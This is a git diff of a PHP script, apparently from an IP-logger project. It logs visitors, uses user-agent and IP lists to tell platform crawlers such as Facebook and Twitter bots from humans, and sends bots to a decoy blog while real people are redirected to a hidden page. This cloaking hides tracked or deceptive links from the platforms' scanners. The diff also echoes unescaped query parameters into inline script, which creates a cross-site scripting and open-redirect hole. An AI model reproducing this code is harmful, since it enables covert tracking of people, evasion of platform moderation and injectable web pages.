@@ -1,5 +1,18 @@
 <?php 
 include("iplogger.php");
+
+function startsWith($haystack, $needle) 
+{
+     return substr($haystack, 0, strlen($needle)) === $needle;
+}
+
+function endsWith($haystack, $needle) 
+{
+    $length = strlen($needle);
+    if(!$length) return true;
+    return substr($haystack, -$length) === $needle;
+}
+
 function IsValidIP() 
 { 
     //https://github.com/CybrDev/IP-Logger Get_IP
@@ -9,7 +22,7 @@ function IsValidIP()
 	else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown")) $ip = getenv("REMOTE_ADDR"); 
 	else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown")) $ip = $_SERVER['REMOTE_ADDR'];     
 	if($ip == "::1") return true; //localhost
-	if (strpos($ip, '2a03:2880:') !== false and strpos($ip, '::face:b00c') !== false) return false; //facebook ipv6
+	if (startsWith($ip, '2a03:2880:') and endsWith($ip, '::face:b00c')) return false; //facebook ipv6
 	return filter_var($ip, FILTER_VALIDATE_IP); //https://stackoverflow.com/a/6211175/11390822
 } 
 
@@ -21,29 +34,57 @@ function IsValidUserAgent()
     $Bots = explode(" ","http:// https:// + .com twitterbot facebot googlebot tumblr linkedinbot snapchat slurp yahoo microsoft bingbot framework bot");
     //$h means list of human user agents, Mostly these words came in human user agent, So we allow only them.
     $Humans =  explode(" ","apple firefox windows android linux chrome safari gecko iphone macintosh mac khtml browser nokia opera mozilla mobile network blackberry cpu outlook pc");
-    foreach ($Bots as $Bot) if (substr_count($User_Agent , $Bot) > 0) return false;
-    foreach ($Humans as $Human) if (substr_count($User_Agent,$Human) > 0) return true;
+    foreach ($Bots as $Bot) 
+	{
+		if (substr_count($User_Agent , $Bot) > 0)
+		{
+			logger("detected as bot at $Bot");
+			return false;
+		}
+	}
+    foreach ($Humans as $Human) 
+	{
+		if (substr_count($User_Agent,$Human) > 0) 
+		{
+			logger("detected as human at $Human");
+			return true;
+		}
+	}
     	 
 }
-$ReFerer = (isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : null);
 
-$Page = str_replace('.html','',$_GET['filename']);
-if((IsValidIP() and IsValidUserAgent()) == true) 
-{	//echo "NOT BOT";
-    LogData(false,$ReFerer,$Page);
-    redirect (".././websites/".$_GET['filename'].(isset($_GET["redirect"]) ? ("?redirect=". $_GET['redirect']) : ""));
-    die();
+function Start()
+{
+    echo "<script src=iplogger.js></script>";
+    $Isbot = (IsValidIP() and IsValidUserAgent()) == false;
+	
+    LogData(
+        $Isbot,
+        (isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : null),
+        str_replace('.html','',$_GET['filename'])
+    );
+	
+	$link =    
+	    $Isbot ?
+        'https://tiplava.blogspot.com' :
+        '.././websites/'.$_GET['filename'].(isset($_GET['redirect']) ? ('?redirect='. $_GET['redirect']) : '');
+		
+	logger("redirecting to $link");
+    redirect (
+        $link
+    );
 }
-else
-{   //echo "BOT";
-    LogData(true,$ReFerer,$Page);
-    redirect( "https://tiplava.blogspot.com");
-    die();
+
+function logger($logs)
+{
+    echo "<script>console.log('$logs')</script>";
 }
 
 function redirect($link)
 {
     echo "<script>window.location.replace('".$link."')</script>";
 }
+
+Start();
 
 ?>
